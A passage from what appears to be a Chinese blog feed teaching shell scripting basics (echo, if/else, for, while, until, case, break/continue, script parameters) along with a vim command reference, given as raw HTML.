class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>echo -e &quot;OK! \c&quot; # -e 开启转义 \c 不换行<br>echo &quot;It is a test&quot;<br></code></pre></div></td></tr></table></figure><p>输出结果：</p><figure class="highlight actionscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs actionscript">OK! It <span class="hljs-keyword">is</span> a test<br></code></pre></div></td></tr></table></figure><h3 id="6-显示结果定向至文件"><a href="#6-显示结果定向至文件" class="headerlink" title="6.显示结果定向至文件"></a>6.显示结果定向至文件</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &quot;It is a test&quot; &gt; myfile#单个&gt;为覆盖 &gt;&gt;为追加<br></code></pre></div></td></tr></table></figure><h3 id="7-原样输出字符串，不进行转义或取变量-用单引号"><a href="#7-原样输出字符串，不进行转义或取变量-用单引号" class="headerlink" title="7.原样输出字符串，不进行转义或取变量(用单引号)"></a>7.原样输出字符串，不进行转义或取变量(用单引号)</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &#x27;$name\&quot;&#x27;<br></code></pre></div></td></tr></table></figure><p>输出结果：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-variable">$name</span>\&quot;<br></code></pre></div></td></tr></table></figure><h3 id="8-显示命令执行结果"><a href="#8-显示命令执行结果" class="headerlink" title="8.显示命令执行结果"></a>8.显示命令执行结果</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo `date`<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong> 这里使用的是反引号 `, 而不是单引号 ‘。</p><p>结果将显示当前日期</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Thu</span> Jul <span class="hljs-number">24</span> <span class="hljs-number">10</span>:<span class="hljs-number">08</span>:<span class="hljs-number">46</span> CST <span class="hljs-number">2014</span><br></code></pre></div></td></tr></table></figure><h2 id="Shell-流程控制"><a href="#Shell-流程控制" class="headerlink" title="Shell 流程控制"></a>Shell 流程控制</h2><p>和 Java、PHP 等语言不一样，sh 的流程控制不可为空，如(以下为 PHP 流程控制写法)：</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><?php if (isset($_GET["q"])) {   search(q); } else {   *// 不做任何事情* }在 sh/bash 里可不能这么写，如果 else 分支没有语句执行，就不要写这个 else。------## if else### fiif 语句语法格式：<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">if condition<br>then<br>    command1 <br>    command2<br>    ...<br>    commandN <br>fi<br></code></pre></div></td></tr></table></figure>写成一行（适用于终端命令提示符）：<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">if [ $(ps -ef | grep -c &quot;ssh&quot;) -gt 1 ]; then echo &quot;true&quot;; fi<br></code></pre></div></td></tr></table></figure>末尾的 fi 就是 if 倒过来拼写，后面还会遇到类似的。### if elseif else 语法格式：<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">if condition<br>then<br>    command1 <br>    command2<br>    ...<br>    commandN<br>else<br>    command<br>fi<br></code></pre></div></td></tr></table></figure>### if else-if elseif else-if else 语法格式：<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">if condition1<br>then<br>    command1<br>elif condition2 <br>then <br>    command2<br>else<br>    commandN<br>fi<br></code></pre></div></td></tr></table></figure>以下实例判断两个变量是否相等：### 实例<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">a=10<br> b=20<br>if [ $a == $b ]<br> then<br>   echo &quot;a 等于 b&quot;<br> elif [ $a -gt $b ]<br> then<br> echo &quot;a 大于 b&quot;<br> elif [ $a -lt $b ]<br> then<br> echo &quot;a 小于 b&quot;<br> else<br>   echo &quot;没有符合的条件&quot;<br> fi<br></code></pre></div></td></tr></table></figure>输出结果：<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span> 小于 <span class="hljs-selector-tag">b</span><br></code></pre></div></td></tr></table></figure>if else 语句经常与 test 命令结合使用，如下所示：### 实例<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">num1=$[2*3]<br>num2=$[1+5]<br>if test $[num1] -eq $[num2]<br>then<br>    echo &#x27;两个数字相等!&#x27;<br>else<br>    echo &#x27;两个数字不相等!&#x27;<br>fi<br></code></pre></div></td></tr></table></figure>输出结果：<figure class="highlight erlang-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang-repl">两个数字相等!<br></code></pre></div></td></tr></table></figure>------## for 循环与其他编程语言类似，Shell支持for循环。for循环一般格式为：<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">for var in item1 item2 ... itemN<br>do<br>    command1<br>    command2<br>    ...<br>    commandN<br>done<br></code></pre></div></td></tr></table></figure>写成一行：<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">for var in item1 item2 ... itemN; do command1; command2… done;<br></code></pre></div></td></tr></table></figure>当变量值在列表里，for 循环即执行一次所有命令，使用变量名获取列表中的当前取值。命令可为任何有效的 shell 命令和语句。in 列表可以包含替换、字符串和文件名。in列表是可选的，如果不用它，for循环使用命令行的位置参数。例如，顺序输出当前列表中的数字：### 实例<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">for loop in 1 2 3 4 5<br>do<br>    echo &quot;The value is: $loop&quot;<br>done<br><br></code></pre></div></td></tr></table></figure>输出结果：<figure class="highlight actionscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs actionscript">The value <span class="hljs-keyword">is</span>: <span class="hljs-number">1</span><br>The value <span class="hljs-keyword">is</span>: <span class="hljs-number">2</span><br>The value <span class="hljs-keyword">is</span>: <span class="hljs-number">3</span><br>The value <span class="hljs-keyword">is</span>: <span class="hljs-number">4</span><br>The value <span class="hljs-keyword">is</span>: <span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure>顺序输出字符串中的字符：<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>for str in This is a string<br>do<br>    echo $str<br>done<br></code></pre></div></td></tr></table></figure>输出结果：<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">This<br><span class="hljs-keyword">is</span><br>a<br><span class="hljs-built_in">string</span><br></code></pre></div></td></tr></table></figure>------## while 语句while 循环用于不断执行一系列命令，也用于从输入文件中读取数据。其语法格式为：<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">while condition<br>do<br>    command<br>done<br></code></pre></div></td></tr></table></figure>以下是一个基本的 while 循环，测试条件是：如果 int 小于等于 5，那么条件返回真。int 从 1 开始，每次循环处理时，int 加 1。运行上述脚本，返回数字 1 到 5，然后终止。### 实例<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>int=1<br>while(( $int&lt;=5 ))<br>do<br>    echo $int<br>    let &quot;int++&quot;<br>done<br><br></code></pre></div></td></tr></table></figure>运行脚本，输出：<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">1<br>2<br>3<br>4<br>5<br></code></pre></div></td></tr></table></figure>以上实例使用了 Bash let 命令，它用于执行一个或多个表达式，变量计算中不需要加上 $ 来表示变量，具体可查阅：[Bash let 命令](https://www.runoob.com/linux/linux-comm-let.html)while循环可用于读取键盘信息。下面的例子中，输入信息被设置为变量FILM，按<Ctrl-D>结束循环。### 实例<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &#x27;按下 &lt;CTRL-D&gt; 退出&#x27;<br>echo -n &#x27;输入你最喜欢的网站名: &#x27;<br>while read FILM<br>do<br>    echo &quot;是的！$FILM 是一个好网站&quot;<br>done<br></code></pre></div></td></tr></table></figure>运行脚本，输出类似下面：<figure class="highlight erlang-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang-repl">按下 &lt;CTRL-D&gt; 退出<br>输入你最喜欢的网站名:nikki!<br>是的！nikki! 是一个好网站<br></code></pre></div></td></tr></table></figure>### 无限循环无限循环语法格式：<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">while :<br>do<br>    command<br>done<br></code></pre></div></td></tr></table></figure>或者<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">while true<br>do<br>    command<br>done<br></code></pre></div></td></tr></table></figure>或者<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">for (( ; ; ))<br></code></pre></div></td></tr></table></figure>------## until 循环until 循环执行一系列命令直至条件为 true 时停止。until 循环与 while 循环在处理方式上刚好相反。一般 while 循环优于 until 循环，但在某些时候—也只是极少数情况下，until 循环更加有用。until 语法格式:<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">until condition<br>do<br>    command<br>done<br></code></pre></div></td></tr></table></figure>condition 一般为条件表达式，如果返回值为 false，则继续执行循环体内的语句，否则跳出循环。以下实例我们使用 until 命令来输出 0 ~ 9 的数字：### 实例<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>a=0<br><br>until [ ! $a -lt 10 ]<br>do<br>   echo $a<br>   a=`expr $a + 1`<br>done<br></code></pre></div></td></tr></table></figure>运行结果：输出结果为：<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">0<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br></code></pre></div></td></tr></table></figure>------## case ... esac**case ... esac** 为多选择语句，与其他语言中的 switch ... case 语句类似，是一种多分枝选择结构，每个 case 分支用右圆括号开始，用两个分号 ;; 表示 break，即执行结束，跳出整个 case ... esac 语句，esac（就是 case 反过来）作为结束标记。可以用 case 语句匹配一个值与一个模式，如果匹配成功，执行相匹配的命令。**case ... esac** 语法格式如下：<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">case 值 in<br>模式1)<br>    command1<br>    command2<br>    ...<br>    commandN<br>    ;;<br>模式2）<br>    command1<br>    command2<br>    ...<br>    commandN<br>    ;;<br>esac<br></code></pre></div></td></tr></table></figure>case 工作方式如上所示，取值后面必须为单词 **in**，每一模式必须以右括号结束。取值可以为变量或常数，匹配发现取值符合某一模式后，其间所有命令开始执行直至 ;;。取值将检测匹配的每一个模式。一旦模式匹配，则执行完匹配模式相应命令后不再继续其他模式。如果无一匹配模式，使用星号 * 捕获该值，再执行后面的命令。下面的脚本提示输入 1 到 4，与每一种模式进行匹配：### 实例<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &#x27;输入 1 到 4 之间的数字:&#x27;<br>echo &#x27;你输入的数字为:&#x27;<br>read aNum<br>case $aNum in<br>    1)  echo &#x27;你选择了 1&#x27;<br>    ;;<br>    2)  echo &#x27;你选择了 2&#x27;<br>    ;;<br>    3)  echo &#x27;你选择了 3&#x27;<br>    ;;<br>    4)  echo &#x27;你选择了 4&#x27;<br>    ;;<br>    *)  echo &#x27;你没有输入 1 到 4 之间的数字&#x27;<br>    ;;<br>esac<br></code></pre></div></td></tr></table></figure>输入不同的内容，会有不同的结果，例如：<figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">输入<span class="hljs-number"> 1 </span>到<span class="hljs-number"> 4 </span>之间的数字:<br>你输入的数字为:<br>3<br>你选择了 3<br></code></pre></div></td></tr></table></figure>下面的脚本匹配字符串：### 实例<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br><br>site=&quot;google&quot;<br><br>case &quot;$site&quot; in<br>   &quot;runoob&quot;) echo &quot;菜鸟教程&quot;<br>   ;;<br>   &quot;google&quot;) echo &quot;Google 搜索&quot;<br>   ;;<br>   &quot;taobao&quot;) echo &quot;淘宝网&quot;<br>   ;;<br>esac<br></code></pre></div></td></tr></table></figure>输出结果为：<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">Google</span> 搜索<br></code></pre></div></td></tr></table></figure>------## 跳出循环在循环过程中，有时候需要在未达到循环结束条件时强制跳出循环，Shell使用两个命令来实现该功能：break和continue。### break命令break命令允许跳出所有循环（终止执行后面的所有循环）。下面的例子中，脚本进入死循环直至用户输入数字大于5。要跳出这个循环，返回到shell提示符下，需要使用break命令。### 实例<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>while :<br>do<br>    echo -n &quot;输入 1 到 5 之间的数字:&quot;<br>    read aNum<br>    case $aNum in<br>        1|2|3|4|5) echo &quot;你输入的数字为 $aNum!&quot;<br>        ;;<br>        *) echo &quot;你输入的数字不是 1 到 5 之间的! 游戏结束&quot;<br>            break<br>        ;;<br>    esac<br>done<br></code></pre></div></td></tr></table></figure>执行以上代码，输出结果为：<figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">输入<span class="hljs-number"> 1 </span>到<span class="hljs-number"> 5 </span>之间的数字:3<br>你输入的数字为 3!<br>输入<span class="hljs-number"> 1 </span>到<span class="hljs-number"> 5 </span>之间的数字:7<br>你输入的数字不是<span class="hljs-number"> 1 </span>到<span class="hljs-number"> 5 </span>之间的! 游戏结束<br></code></pre></div></td></tr></table></figure>## continuecontinue命令与break命令类似，只有一点差别，它不会跳出所有循环，仅仅跳出当前循环。对上面的例子进行修改：### 实例<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>while :<br>do<br>    echo -n &quot;输入 1 到 5 之间的数字: &quot;<br>    read aNum<br>    case $aNum in<br>        1|2|3|4|5) echo &quot;你输入的数字为 $aNum!&quot;<br>        ;;<br>        *) echo &quot;你输入的数字不是 1 到 5 之间的!&quot;<br>            continue<br>            echo &quot;游戏结束&quot;<br>        ;;<br>    esac<br>done<br></code></pre></div></td></tr></table></figure>运行代码发现，当输入大于5的数字时，该例中的循环不会结束，语句 `echo "游戏结束"` 永远不会被执行。]]></content>
    
    
    <categories>
      
      <category>Shell Shell Base</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vim</title>
    <link href="/2021/05/05/Linux/vim/"/>
    <url>/2021/05/05/Linux/vim/</url>
    
    <content type="html"><![CDATA[<h1 id="vim学习"><a href="#vim学习" class="headerlink" title="vim学习"></a>vim学习</h1><p>基础部分</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">:<span class="hljs-built_in">set</span> number<br>显示哪一行<br>:1,xd <br>删除从第一行到x行<br>G<br>转到文件结尾<br>9G<br>转到第九行<br>:1,.d<br>在vi中 ，“.”当前行 ，“1,.”表示从第一行到当前行 ，“d”删除，3dd代表删除三行。<br><span class="hljs-comment"># 查找通过n或N进行上下查找匹配</span><br>/关键字 <span class="hljs-comment"># 向下查找</span><br>?关键字 <span class="hljs-comment"># 向上查找</span><br></code></pre></div></td></tr></table></figure><table><thead><tr><th>命令</th><th>简单说明</th></tr></thead><tbody><tr><td>:w</td><td>保存编辑后的文件内容，但不退出vim编辑器。这个命令的作用是把内存缓冲区中的数据写到启动vim时指定的文件中。</td></tr><tr><td>:w!</td><td>强制写文件，即强制覆盖原有文件。如果原有文件的访问权限不允许写入文件，例如，原有的文件为只读文件，则可使用这个命令强制写入。但是，这种命令用法仅当用户是文件的属主时才适用，而超级用户则不受此限制。</td></tr><tr><td>:wq</td><td>保存文件内容后退出vim编辑器。这个命令的作用是把内存缓冲区中的数据写到启动vim时指定的文件中，然后退出vim编辑器。另外一种替代的方法是用ZZ命令。</td></tr><tr><td>:wq!</td><td>强制保存文件内容后退出vim编辑器。这个命令的作用是把内存缓冲区中的数据强制写到启动vim时指定的文件中，然后退出vim编辑器。</td></tr><tr><td>ZZ</td><td>使用ZZ命令时，如果文件已经做过编辑处理，则把内存缓冲区中的数据写到启动vim时指定的文件中，然后退出vim编辑器。否则只是退出vim而已。注意，ZZ命令前面无需加冒号“：”，也无需按Enter键。</td></tr><tr><td>:q</td><td>在未做任何编辑处理而准备退出vim时，可以使用此命令。如果已做过编辑处理，则vim不允许用户使用“:q”命令退出，同时还会输出下列警告信息： No write since last change (:quit! overrides)</td></tr><tr><td>:q!</td><td>强制退出vim编辑器，放弃编辑处理的结果。如果确实不需要保存修改后的文件内容，可输入“:q!”命令，强行退出vim编辑器。</td></tr><tr><td>:w filename</td><td>把编辑处理后的结果写到指定的文件中保存</td></tr><tr><td>:w! filename</td><td>把编辑处理后的结果强制保存到指定的文件中，如果文件已经存在，则覆盖现有的文件。</td></tr><tr><td>:wq! filename</td><td>把编辑处理后的结果强制保存到指定的文件中，如果文件已经存在，则覆盖现有文件，并退出vim编辑器</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell base -2</title>
    <link href="/2021/05/03/Shell/ShellBase/shell%20base%20-2/"/>
    <url>/2021/05/03/Shell/ShellBase/shell%20base%20-2/</url>
    
    <content type="html"><![CDATA[<h2 id="Shell-传递参数"><a href="#Shell-传递参数" class="headerlink" title="Shell 传递参数"></a>Shell 传递参数</h2><p>我们可以在执行 Shell 脚本时，向脚本传递参数，脚本内获取参数的格式为：**$n<strong>。</strong>n** 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推……</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>以下实例我们向脚本传递三个参数，并分别输出，其中 <strong>$0</strong> 为执行的文件名（包含文件路径）：</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Shell 传递参数实例！&quot;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;执行的文件名：<span class="hljs-variable">$0</span>&quot;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第一个参数为：<span class="hljs-variable">$1</span>&quot;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第二个参数为：<span class="hljs-variable">$2</span>&quot;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第三个参数为：<span class="hljs-variable">$3</span>&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>为脚本设置可执行权限，并执行脚本，输出结果如下所示：</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">$ chmod +x <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span> <br>$ ./<span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span> 1 2 3<br><span class="hljs-keyword">Shell</span> 传递参数实例！<br>执行的文件名：./<span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span><br>第一个参数为：1<br>第二个参数为：2<br>第三个参数为：3<br></code></pre></div></td></tr></table></figure><p>另外，还有几个特殊字符用来处理参数：</p><table><thead><tr><th>参数处理</th><th>说明</th></tr></thead><tbody><tr><td>$#</td><td>传递到脚本的参数个数</td></tr><tr><td>$*</td><td>以一个单字符串显示所有向脚本传递的参数。  如”$*”用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。</td></tr><tr><td>$$</td><td>脚本运行的当前进程ID号</td></tr><tr><td>$!</td><td>后台运行的最后一个进程的ID号</td></tr><tr><td>$@</td><td>与$*相同，但是使用时加引号，并在引号中返回每个参数。  如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。</td></tr><tr><td>$-</td><td>显示Shell使用的当前选项，与<a href="https://www.runoob.com/linux/linux-comm-set.html">set命令</a>功能相同。</td></tr><tr><td>$?</td><td>显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td></tr></tbody></table><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span 